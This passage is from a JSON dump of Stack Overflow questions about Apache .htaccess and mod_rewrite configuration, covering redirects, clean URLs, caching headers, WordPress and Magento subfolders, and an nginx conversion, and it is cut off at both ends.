RewriteRule %{DOCUMENT_ROOT}/apps/%1/webroot%{REQUEST_URI} [L]\n\nRewriteRule ^(.*)$ index.php?uri=$1 [QSA,L]\n</code></pre>\n\n<p>basically, if someone visits <code>foo.com</code> on any sub-domain, I want them to be served files directly from that folder but also have any requests that aren't for specific files sent to my <code>index.php</code> file for processing (which will do the routing)</p>\n\n<p>The reason I am asking is because what I have written above does not actually work, so is there a way to do it? (also if this SHOULD work then it'll obviously be a problem with the rest of my <code>.htaccess</code> file, but it all works when dealing with just one application folder)</p>\n\n<p>The other (messy IMO) way would be to route everything to the folders and have a second <code>.htaccess</code> file for each domain, but I'd rather not do this if it can be done in one file!</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12217261,"title":".htaccess mod_rewrite with multiple variable in url","body":"<p>I'm using a search that create a query string for MySQL and show the result. The thing is that the query doesn't have the same length of variable each time a search is made.</p>\n\n<p>I was wondering if in .htaccess it's possible to make a mod_rewrite depending on how much variable I throw at it.</p>\n\n<p>Instead of having this in the URL</p>\n\n<pre><code>results.php?var1=something&amp;var2=something&amp;var3=.....\n</code></pre>\n\n<p>I get this</p>\n\n<pre><code>results/var1/something/var2/something/var3/something...\n</code></pre>\n\n<p>But remember that the numbers of vars can change depending on which checkboxes are checked by the user on the search form. </p>\n\n<p>I hope it's clear if not I'll try to add more example.</p>\n"},{"tags":["php",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":35,"score":3,"question_id":12216398,"title":".htaccess match anything and send to PHP file","body":"<p>My regex tries to match all results and redirect to a page.  I want to send the address requested to the page:</p>\n\n<pre><code>RewriteRule ^/[\\w\\W]*$ processor.php [R,NC,L]\n</code></pre>\n\n<p>For instance, my address is:</p>\n\n<pre><code>www.mywebsite.com/mySecretCode123\n</code></pre>\n\n<p>I want my php file to be able to read it:</p>\n\n<pre class=\"lang-php prettyprint-override\"><code>&lt;?php echo $mySecretCode123; /* outputs 'mySecretCode123' */ ?&gt;\n</code></pre>\n\n<p>How can I do this?</p>\n"},{"tags":["php",".htaccess","redirect","rewrite","mod"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":92,"score":1,"question_id":12199646,"title":".htaccess redirection not working","body":"<p>I have the following rules in my .htaccess file</p>\n\n<pre><code>RewriteEngine On\n#1. home page redirection\nRewriteRule ^$ php/home.php [QSA,L]                                        \n\n#2. Detect Non valid files (for menus)\nRewriteCond %{REQUEST_FILENAME} !-f\n\n#3. append php/query.php                                                   \nRewriteRule ^(.*)$ php/$1.php [QSA,L]         \n</code></pre>\n\n<p><strong>UPDATE : The problem was that I did not have .htaccess in wp directory.</strong></p>\n\n<p>This working fine but I have recently installed wordpress in\na sub folder of my website called wp. Listing the wordpress posts\nworks fine in my blog.php.</p>\n\n<p>The user access the blog webpage by this url <code>http://mysite/blog</code>\nthen <code>rule #2</code> is executed.</p>\n\n<p>The problem is that rule #2 and #3 is also fired when accessing the \nwordpress articles and admin portal. How do I prevent that from\nhappening in this situation, i need to access the below URLs.</p>\n\n<blockquote>\n  <p>Internal Server Error</p>\n</blockquote>\n\n<p><code>http://mysite/wp/wp-admin</code></p>\n\n<blockquote>\n  <p>Internal Server Error</p>\n</blockquote>\n\n<p><code>http://mysite/wp/some-article</code></p>\n\n<p><strong>Folder structure</strong></p>\n\n<pre><code>|-mysite\n  |- css\n  |- .htaccess\n  |- wordpress\n    |- wp\n    |- wp-admin\n  |- php\n    |- index.php\n    |- blog.php\n  |- js\n</code></pre>\n\n<p>Any help/advice much appreciated.</p>\n\n<p>Thanks</p>\n\n<p><strong>UPDATE : Everything is working now - This is my .htaccess file</strong></p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteRule ^$ php/home.php [QSA,L]                                                                                                                 \n#WP articles\nRewriteRule ^blog/([A-Za-z0-9-]+)/?$ wp/$1 [QSA,L]\n\n#WP archives                     \nRewriteRule ^blog/([0-9]{4}/[0-9]{2})/?$ wp/$1 [QSA,L]\n\n#WP search                                       \nRewriteCond %{QUERY_STRING} ^s=(.*)$\nRewriteRule . wp/$/%1? [QSA,L]\n\n#WP categories                \nRewriteRule ^blog/category/([A-Za-z0-9-]+)/?$ wp/$1 [QSA,L]\n\n#WP tags\nRewriteRule ^blog/tag/([A-Za-z0-9-]+)/?$ wp/$1 [QSA,L]\n\n#WP authors\n#Insert authors redirect\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(.*)$ php/$1.php [QSA,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p><strong>I also experienced a 404 error when accessing my blog page - this was\ncaused by including the wp-blog-header.php file, the solution was to \ninsert the following code in my blog.php and remove</strong>\n<code>include('wp/wp-blog-header.php)</code></p>\n\n<pre><code>&lt;?php\n   require('./wp-config.php');\n   $wp-&gt;init();\n   $wp-&gt;parse_request();\n   $wp-&gt;query_posts();\n   $wp-&gt;register_globals();\n?&gt;\n</code></pre>\n"},{"tags":["apache",".htaccess","url","double","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":110,"score":2,"question_id":8817836,"title":"double url apache htaccess rewrite","body":"<p>I have been searching the world wide web for a while now but can't seem to solve the issue.</p>\n\n<p>I have a site where the base url has been entered as:</p>\n\n<p><a href=\"http://mydomain.com\" rel=\"nofollow\">http://mydomain.com</a></p>\n\n<p>The CMS will then a '/' at the end. Now, when the RSS feed is created the url does this:</p>\n\n<p><a href=\"http://mydomain.com/http://mydomain.com/link/to/page/location.htm\" rel=\"nofollow\">http://mydomain.com/http://mydomain.com/link/to/page/location.htm</a></p>\n\n<p>I haveonly just really started to look into regular expression with the .htaccess file and can't seem to figure this out?</p>\n\n<p>Has anyone had this problem or can somebody point me in the right direction?</p>\n\n<p>The page created for the link is a 404.</p>\n\n<p>Cheers</p>\n\n<p>smilinmonki666</p>\n"},{"tags":[".htaccess"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":197,"score":2,"question_id":12084961,"title":"Can't set cache control public to .js, .css and image files","body":"<p>I used Chrome to audit my site and I discovered .js and .css files weren't being cached though I had set up my .htaccess file to do so.</p>\n\n<p>I removed everything from my site's root htaccess file except the code below and I'm still getting the message \"The following resources are explicitly non-cacheable. Consider making them cacheable if possible\" in Chrome indicating my main external .js and .css files aren't being cached. These files and images represent like 90% of the total download size so not being able to cache them is driving me crazy.</p>\n\n<p>This is currently the code of my .htaccess file. Having it exactly like this still doens't cache anything.</p>\n\n<pre><code># Disable Etags\nHeader unset ETag\nFileETag None\n\n# Expires\nExpiresActive On\nExpiresDefault \"access plus 1 year\"\nHeader unset Last-Modified\nHeader set Cache-Control \"public\"\n\n&lt;FilesMatch \"\\.(pl|php|cgi|spl|scgi|fcgi|html?)$\"&gt;\nHeader set Cache-Control \"private, must-revalidate, proxy-revalidate\"\nExpiresDefault A0\nExpiresActive Off\n&lt;/FilesMatch&gt;\n\n# Enable Compresion\n&lt;FilesMatch \".(js|css|html|htm|php|xml)$\"&gt;\nSetOutputFilter DEFLATE\n&lt;/FilesMatch&gt;\n</code></pre>\n\n<p>You can see this code not working at <a href=\"http://lujanventas.com\" rel=\"nofollow\">http://lujanventas.com</a></p>\n\n<p>How can I set cache control public to .css, .js and image files?</p>\n"},{"tags":[".htaccess","w3c-validation","http-status-code-403"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":12214088,"title":"W3C Validation returning 403 Forbidden","body":"<p>I've got a strange problem about my website: when I try to validate HTML using W3C Validator, I get a 403 Forbidden message and I'm unable to check it. I tried another validator and it worked...<br>\nHowever I get another 403 error when Disqus tries to load, in the wordpress blog section of my site.  </p>\n\n<p>I changed file permissions but nothing has changed... But website works very well in a browser, It loads without any error!  </p>\n\n<p>I've also checked <code>robots.txt</code> and <code>.htaccess</code> but there is nothing which can block that website. This is my root <code>.htaccess</code> file:  </p>\n\n<pre><code>SetEnv PHP_VER 5\nSetEnv REGISTER_GLOBALS 0\nDirectoryIndex index.php\n\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^apps/wishonlist/appstore(/)?$ http://clk.tradedoubler.com/click?p=24373&amp;a=1947754&amp;url=http://itunes.apple.com/it/app/wishonlist/id418044882?mt=8&amp;uo=4&amp;partnerId=2003 [R=301,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>How can I solve this problem?<br>\nThank you so much for your help!</p>\n"},{"tags":["apache",".htaccess","nginx","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12206560,"title":"Converting Apache rewrite rules to an nginx config file","body":"<p>I have a pretty simple <code>.htaccess</code> file which I need to convert over to an nginx config:</p>\n\n<pre><code>RewriteRule ^api$ api.php [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . index.php [L]\n</code></pre>\n\n<p>I tried to make a start by doing:</p>\n\n<pre><code>location / {\n    rewrite ^(.*)$ /index.php;\n}\n</code></pre>\n\n<p>but whenever I load the base URL of my web page my browser just downloads the index.php file. I do also have this in my config:</p>\n\n<pre><code>location ~ \\.php$ {\n    fastcgi_split_path_info ^(.+\\.php)(/.+)$;\n    fastcgi_pass unix:/var/run/php5-fpm.sock;\n    fastcgi_index index.php;\n    include fastcgi_params;\n}\n</code></pre>\n\n<p>but for some reason nginx still passes it as a download. What's the correct config here?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12211454,"title":"Error in htaccess rewrite rule","body":"<p>I am trying to make sure that if HTTPS is used outside of the secure subdomain it gets redirected to HTTP.</p>\n\n<p>This is what I have in the root .htaccess file:</p>\n\n<pre><code># Redirect HTTPS requests for non-SSL pages back to HTTP. (Note that shared objects\n# such as images are excluded from this rule)\n\nRewriteCond %{HTTPS} =on\n\n# my.EXAMPLE.com is the secure subdirectory.\nRewriteCond %{HTTP_HOST} !^my.EXAMPLE.com [NC]\n\nRewriteCond $1 !\\.(gif|jpe?g|png|ico|css|js)$\nRewriteRule ^(.*)$ http://www.EXAMPLE.com/$1 [R=301]\n</code></pre>\n\n<p>Put simply:</p>\n\n<pre><code>if HTTPS\nif not in my.example.com\nif NOT an image/css/js file\nredirect to HTTP\n</code></pre>\n\n<p>But this is not working as expected, instead if I try to access a page outside of the my.example.com sub-directory via HTTPS I get a 404 Not Found error. Accessing the same page via HTTP has no problems, it works fine.</p>\n\n<p>Any idea why this rule may not be working?</p>\n\n<h1>EDIT</h1>\n\n<p>Here's the entire .htaccess file:</p>\n\n<pre><code># Don't display .htacess files in directory listings.\nIndexIgnore .htaccess\nOptions +FollowSymLinks\nRewriteEngine on\n\n# Password protected for now\nAuthType Basic\nAuthName \"EXAMPLE\"\nAuthUserFile \"/home/EXAMPLE/.htpasswds/public_html/passwd\"\nrequire valid-user\n\n# Redirect HTTPS requests for non-SSL pages back to HTTP. (Note that shared objects\n# such as images on both HTTP and HTTPS pages are excluded from this rule)\nRewriteCond %{HTTPS} on\nRewriteCond %{HTTP_HOST} !^my\\.EXAMPLE\\.com$ [NC]\nRewriteCond %{REQUEST_FILENAME} !\\.(gif|jpe?g|png|ico|css|js)$\nRewriteRule ^(.*)$ http://www.EXAMPLE.com/$1 [R=301]\n\n\n# Redirect non-www requests to www\nRewriteCond %{HTTP_HOST} ^EXAMPLE.com$\nRewriteCond %{HTTP_HOST} !^my\\.EXAMPLE\\.com [NC]\nRewriteRule ^(.*)$ \"http\\:\\/\\/www\\.EXAMPLE\\.com\\/$1\" [R=301]\n\n# Prevent direct access to the WHMCS folder must be accessed through secure subdomain\nRedirectMatch 301 ^/WHMCS/(.*)$ https://my.EXAMPLE.com/$1\n\n\nErrorDocument 404 /404.php\n</code></pre>\n"},{"tags":[".htaccess","redirect","joomla","article"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12205293,"title":"Redirect by .htaccess doesn't work","body":"<p>I want the URL www.michelenerna.nl to be redirected to www.michelenerna.nl/wycliffe. </p>\n\n<p>The actual Joomla path is /wycliffe = \n<a href=\"http://www.michelenerna.nl/index.php?option=com_content&amp;view=article&amp;id=97&amp;Itemid=249\" rel=\"nofollow\">http://www.michelenerna.nl/index.php?option=com_content&amp;view=article&amp;id=97&amp;Itemid=249</a></p>\n\n<p>So, I thought: the following lines in .htaccess should be appropriate, but it doesn't work. www.michelenerna.nl still directs to www.michelenerna.nl</p>\n\n<p>This is the code: </p>\n\n<pre><code>Options SymlinksIfOwnerMatch\nRewriteEngine On\nRewriteCond %{HTTP_HOST} ^www.michelenerna.nl [NC]\nRewriteRule ^article(.*)$ http://www.michelenerna.nl/index.php?option=com_content&amp;view=article&amp;id=97&amp;Itemid=249/$1 [R=301,L]\n</code></pre>\n\n<p>Why doesn't it work? </p>\n"},{"tags":["php",".htaccess","mod-rewrite","url-rewriting","http-headers"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12211234,"title":"Rewrite same URL structure to two differents PHP scripts","body":"<p>My site uses URLs like <code>example.de/user1</code> or <code>example.de/project33</code>, which can be rewritten by an .htaccess-file.</p>\n\n<p>The string after the slash is choosen by a user.</p>\n\n<p>My problem is, that some URLs are user profile links and should be rewritten to <code>profile.php?id=...</code> and some URLs are project-links, which should be rewritten to <code>project.php...</code></p>\n\n<p>How can you handle it?</p>\n\n<p>I thought about a HTTP header, which trigger a rewriteCondition (like -l, -f, -d etc...).</p>\n"},{"tags":["apache",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12210881,"title":".htaccess to allow one file and one folder to be accessed","body":"<p>My folder structure looks something like this.</p>\n\n<pre><code>-beta\n   +folder1\n   +folder2\n   +folder3\n   file1.php\n   file2.php\n</code></pre>\n\n<p>Now i want to restrict all files and folders but not folder2 and file2.php\nHow can i write my .htaccess to do this. This is what i have written.</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\nRewriteCond %{REQUEST_URI} !/folder2%$\nRewriteCond %{REQUEST_URI} !/file2.php\nRewriteRule $ /beta/file2.php [R=302,L]\n</code></pre>\n\n<p>Somehow the above does work in one system but not from other system. Can you point out what i am doing wrong here ?</p>\n\n<p>Thanks,</p>\n\n<p>Saha</p>\n"},{"tags":["php","html","css",".htaccess","mod-rewrite"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12209587,"title":"PHP Obtain the URL as a variable","body":"<p>I have noticed that many websites use urls that end in </p>\n\n<pre><code>website.com/index.php?var=\"value\"&amp;var2=\"value2\"\n</code></pre>\n\n<p>and I was wondering how I could make it so that instead of having that be the end of the URL have this instead:</p>\n\n<pre><code>website.com/value/value2\n</code></pre>\n\n<p>and then have it so that instead of searching for \"/value/value2\" inside of the servers root folder it would instead just open <em>index.php</em> and then inside the <em>PHP</em> coding have a function that would get what the <em>URL</em> is. Either as a string \"/value/value2\" or an array \"value\" \"value2\" it doesn't matter but just some way of getting those variables. This would be so that the <em>URL</em> could be cleaned up and easy to tell where you were in the website.</p>\n\n<p>Also if there is a way of doing this would it be possible for <em>style.php</em> that is in the same folder as <em>index.php</em> (but has a <em>PHP header</em> setting it to output <em>CSS</em>) that would be called in the head of <em>index.php</em> using <code>&lt;link rel=\"stylesheet\" type=\"text/css\" url=\"style.php\" /&gt;</code> or whatever the syntax for that is, to be able to obtain that same variable so that the <em>css</em> styling could be changed according to the <em>URL</em>.</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12209443,"title":"Redirecting url using .htaccess in a subdirectory","body":"<p>I have a sub directory named \"blog\". I want to clean the url when accessing this directory in web browser. So I want that when I type</p>\n\n<pre><code>www.example.com/blog/index.php?id=1\n</code></pre>\n\n<p>The webbroswer must show like this:</p>\n\n<pre><code>www.example.com/blog/posts/1\n</code></pre>\n\n<p>I successfully implemented this when there was no sub directory, but in sub directory case it shows me a 404 error.</p>\n\n<p>Here what I have done in my .htaccess file to make it work when I was implementing it in the <strong>root</strong> directory(not in  the subdirectory).</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^posts/([^/]*)$ /index.php?id=$1 [L]\n</code></pre>\n\n<p>And I wrote my url in the <code>index.php</code> file as</p>\n\n<pre><code>echo '&lt;a href=\"www.example.com/posts/' . $row['id'] . '\"&gt;' .  $row['title']  . '&lt;/a&gt;';\n</code></pre>\n\n<p>But the problem is when the same thing I tried to implement in a sub directory named \"blog\", it shows me a 404 error.</p>\n\n<p>I tried this <code>rule</code> in <code>.htaccess</code>., but it did not work.</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} !^/blog/.*$\nRewriteRule ^(.*)$ /blog/$1 [L]\n</code></pre>\n\n<p><strong>I am keeping my <code>.htaccess</code> file in the sub directory named <code>blog</code>.</strong></p>\n\n<p>I tried many questions in <code>StackOverflow</code>, but none seems to solve my problem.\nAny help would be appreciated.</p>\n"},{"tags":[".htaccess","magento","installation","install"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":12189337,"title":"500 error after configuration page, setting up magento with substore","body":"<p>I have created a working magento site now I am trying to create a test environment based on the existing working site.  It is on the same server and will be under a different sub domain.</p>\n\n<p>workingSubDomain.domain.com/store/\nnewSubDomain.domain.com/store/</p>\n\n<p>I have kept the substore directory structure the same as the working site.</p>\n\n<p>I have gone through and set all of the folders to 755 with the app/etc/, media, var set to 777</p>\n\n<p>After I click continue on the installation wizard configuration page I recieve a 500 error.</p>\n\n<p>The server log file shows the following:</p>\n\n<pre><code>PHP Fatal error: Call to a member function insert() on a non-object in /var/www/vhosts/domain.com/magentoFolder/subStore/app/code/core/Mage/Core/Model/Resource/Resource.php on line 133, referer: http://newSubDomain.domain.com/subStore/index.php/install/wizard/config/?config%5Blocale%5D=en_US&amp;config%5Btimezone%5D=America%2FChicago&amp;config%5Bcurrency%5D=USD\n</code></pre>\n\n<p>I have tried the following url rewrites in the .htaccess folder:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /clint/\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /clint/index.php [L]\n</code></pre>\n\n<p>and</p>\n\n<pre><code>RewriteBase /magentoFolder/subStore\n</code></pre>\n\n<p>and</p>\n\n<pre><code>RewriteBase /magentoFolder/subStore/\n</code></pre>\n\n<p>and</p>\n\n<pre><code>RewriteBase /magentoFolder/\n</code></pre>\n\n<p>and</p>\n\n<pre><code>RewriteBase /subStore/\n</code></pre>\n\n<p>I have cleared out the var folder as well.</p>\n\n<p>Any recommendations would be much appreciated.</p>\n\n<p>Here is the code from line 133 in the resource.php file:</p>\n\n<pre><code> * Set module version into DB\n *\n * @param string $resName\n * @param string $version\n * @return int\n */\npublic function setDbVersion($resName, $version)\n{\n    $dbModuleInfo = array(\n        'code'    =&gt; $resName,\n        'version' =&gt; $version,\n    );\n\n    if ($this-&gt;getDbVersion($resName)) {\n        self::$_versions[$resName] = $version;\n        return $this-&gt;_getWriteAdapter()-&gt;update($this-&gt;getMainTable(),\n                $dbModuleInfo,\n                array('code = ?' =&gt; $resName));\n    } else {\n        self::$_versions[$resName] = $version;\n        return $this-&gt;_getWriteAdapter()-&gt;insert($this-&gt;getMainTable(), $dbModuleInfo);\n    }\n}\n</code></pre>\n"},{"tags":[".htaccess","url","mod-rewrite","redirect","urlrewriter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":11569455,"title":"Total noob at url_rewrite. Please","body":"<p>I am trying to rewrite my URL and having serious issues. I am on a godaddy linux hosting server and it didn't come with any type of config file or .htaccess file.  I created my own .htaccess file with the below rewrite info but I have no idea how to do anything else.</p>\n\n<p>RewriteEngine On\nRewriteRule ^NSN/([^/]*).html$ /nsn.php?NSN=$1 [L]</p>\n\n<p>The people at godaddy told me I could use URL Redirect to help with this but I am not even sure what that means.</p>\n\n<p>If someone could please help with the next steps of how to make this work, it would be greatly appreciated.</p>\n\n<p>Thank You.</p>\n"},{"tags":[".htaccess","url-rewriting","friendly-url"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12160723,"title":"Mobile Version Rendered By A Different PHP File Preserving Friendly URL's","body":"<p>I have a website about books.\nCurrently, it already has some URL Rewrite rules on my .htaccess file, so that such URL's are more friendly:</p>\n\n<p><a href=\"http://www.example.com/book.php?book=xxx\" rel=\"nofollow\">http://www.example.com/book.php?book=xxx</a>  -> <a href=\"http://www.example.com/book/xxx.html\" rel=\"nofollow\">http://www.example.com/book/xxx.html</a></p>\n\n<p>The rule for that:</p>\n\n<p>RewriteRule ^book/([^/]+).html$ book.php?book=$1 [QSA,L]</p>\n\n<p>Now I am developing a mobile version exclusevely to the book section, that means that the index.php and all other pages remain the same. So I would like to have URL's like this (when the user agent is detected as of a mobile gadget):</p>\n\n<p><a href=\"http://www.example.com/mobile/m_book.php?book=xxx\" rel=\"nofollow\">http://www.example.com/mobile/m_book.php?book=xxx</a> -> <a href=\"http://m.example.com/book/xxx.html\" rel=\"nofollow\">http://m.example.com/book/xxx.html</a></p>\n\n<p>My current solution (<strong>that is not working</strong>), rewrites the url correctly, but then the server does not find the PHP to render the page and I receive a \"Server not found\" on the browser.\nThe PHP file to render regular book page is book.php, but the PHP file responsible to render only to mobile devices is in a subfolder and can be found by: mobile/m_book.php</p>\n\n<pre><code>RewriteEngine On\n\n#To detect mobile browsers\nRewriteCond %{HTTP_USER_AGENT} android|avantgo|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge\\ |maemo|midp|mmp|opera\\ m(ob|in)i|palm(\\ os)?|phone|p(ixi|re)\\/|plucker|pocket|psp|symbian|treo|up\\.(browser|link)|vodafone|wap|windows\\ (ce|phone)|xda|xiino [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} ^(1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a\\ wa|abac|ac(er|oo|s\\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\\-m|r\\ |s\\ )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\\-(n|u)|c55\\/|capi|ccwa|cdm\\-|cell|chtm|cldc|cmd\\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\\-s|devi|dica|dmob|do(c|p)o|ds(12|\\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\\-|_)|g1\\ u|g560|gene|gf\\-5|g\\-mo|go(\\.w|od)|gr(ad|un)|haie|hcit|hd\\-(m|p|t)|hei\\-|hi(pt|ta)|hp(\\ i|ip)|hs\\-c|ht(c(\\-|\\ |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\\-(20|go|ma)|i230|iac(\\ |\\-|\\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt(\\ |\\/)|klon|kpt\\ |kwc\\-|kyo(c|k)|le(no|xi)|lg(\\ g|\\/(k|l|u)|50|54|e\\-|e\\/|\\-[a-w])|libw|lynx|m1\\-w|m3ga|m50\\/|ma(te|ui|xo)|mc(01|21|ca)|m\\-cr|me(di|rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\\-|\\ |o|v)|zz)|mt(50|p1|v\\ )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\\-2|po(ck|rt|se)|prox|psio|pt\\-g|qa\\-a|qc(07|12|21|32|60|\\-[2-7]|i\\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\\-|oo|p\\-)|sdk\\/|se(c(\\-|0|1)|47|mc|nd|ri)|sgh\\-|shar|sie(\\-|m)|sk\\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\\-|v\\-|v\\ )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\\-|tdg\\-|tel(i|m)|tim\\-|t\\-mo|to(pl|sh)|ts(70|m\\-|m3|m5)|tx\\-9|up(\\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\\-|\\ )|webc|whit|wi(g\\ |nc|nw)|wmlb|wonu|x700|xda(\\-|2|g)|yas\\-|your|zeto|zte\\-) [NC]\n#To avoid loops\nRewriteCond %{HTTP_HOST} !^m\\.example\\.com$ [NC]\n#First Rewrite Rule\nRewriteRule ^book/([^/]+)\\.html$ http://m.example.com/m_book.php?book=$1 [QSA,L,R]\n\n#Only the mobile request should be rendered by mobile/m_book.php\nRewriteCond %{HTTP_HOST} ^m\\.example\\.com$ [NC]\nRewriteRule ^book/([^/]+)\\.html$ mobile/m_book.php?book=$1 [QSA,L,R]\n\n#Otherwise (the already predefined rule)\nRewriteRule ^book/([^/]+)\\.html$ book.php?book=$1 [QSA,L]\n</code></pre>\n\n<p><strong>What is wrong with this piece of code?</strong></p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":12206525,"title":"Redirect PHP to HTML, but have HTML point to PHP","body":"<p>Consider the following rules</p>\n\n<pre><code>RewriteRule ^index\\.html$ index.php [L]\nRewriteRule ^index\\.php$ index.html [R=301]\n</code></pre>\n\n<p>I want <code>.html</code> to use the <code>.php</code> file, but I want the url to have the <code>.html</code> extension always.</p>\n\n<p>The above rule creates a redirection loop. What's the right way to do this?</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12203214,"title":"htaccess redirections","body":"<p>I have changed my website's root directory - is it possible to create htaccess which will redirect everything to the new root (like all anchors, headers etc) ?</p>\n\n<p>I've tried things such as:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{REQUEST_URI} ^/$\nRewriteRule (.*) http://localhost/root/index.php [R=301,L]\n</code></pre>\n\n<p>But it only redirects to the new folder when I'm opening localhost/, otherwise if I click an anchor it doesn't redirect anywhere.</p>\n\n<p>This is specifically what I want to achieve:<br />\nAnchor is to: <em>localhost/user</em><br />\nI want to redirect it to: <em>localhost/<strong>root</strong>/user</em></p>\n"},{"tags":["php",".htaccess","mod-rewrite","rewrite"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12205631,"title":"htaccess: remove portion of url","body":"<p>if my URL was:\n<code>http://mywebsite.com/lawyer/my-lawyer-profile</code></p>\n\n<p>How would I remove <code>lawyer</code> from the URL for all similar requests?</p>\n\n<pre><code>RewriteRule ^lawyer/(.+)/$ /$1\n</code></pre>\n\n<p>That doesn't seem to work ... of course, I can access the url as <code>http://mywebsite.com/my-lawyer-profile</code> but I need the URL to always rewrite.</p>\n"},{"tags":[".htaccess","subdirectory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12204594,"title":"How do I create a exception for a subdirectoy so the main HTacces won't interfere with subdirectory?","body":"<p>Well I have a main website which runs ELGG1.8 and it needs it's own created htaccess to function properly. But now I want to create a subdirectory in my main folder and the main /htaccess is messing it up, I cannot acces the folder, just run html files, no php, nothing..</p>\n\n<p>How can I edit this .htaccess to make an exception?</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n\nRewriteEngine on\n\n# If Elgg is in a subdirectory on your site, you might need to add a RewriteBase line\n# containing the path from your site root to elgg's root. e.g. If your site is\n# http://example.com/ and Elgg is in http://example.com/sites/elgg/, you might need\n#\n#RewriteBase /sites/elgg/\n#\n# here, only without the # in front.\n#\n# If you're not running Elgg in a subdirectory on your site, but still getting lots\n# of 404 errors beyond the front page, you could instead try:\n#\n#RewriteBase /\n\n# In for backwards compatibility\nRewriteRule ^pg\\/([A-Za-z0-9\\_\\-]+)$ engine/handlers/page_handler.php?handler=$1&amp;%{QUERY_STRING}\nRewriteRule ^pg\\/([A-Za-z0-9\\_\\-]+)\\/(.*)$ engine/handlers/page_handler.php?handler=$1&amp;page=$2&amp;%{QUERY_STRING}\nRewriteRule ^tag\\/(.+)\\/?$ engine/handlers/page_handler.php?handler=search&amp;page=$1\n\n\nRewriteRule ^action\\/([A-Za-z0-9\\_\\-\\/]+)$ engine/handlers/action_handler.php?action=$1&amp;%{QUERY_STRING}\n\nRewriteRule ^cache\\/(.*)$ engine/handlers/cache_handler.php?request=$1&amp;%{QUERY_STRING}\n\nRewriteRule ^services\\/api\\/([A-Za-z0-9\\_\\-]+)\\/(.*)$ 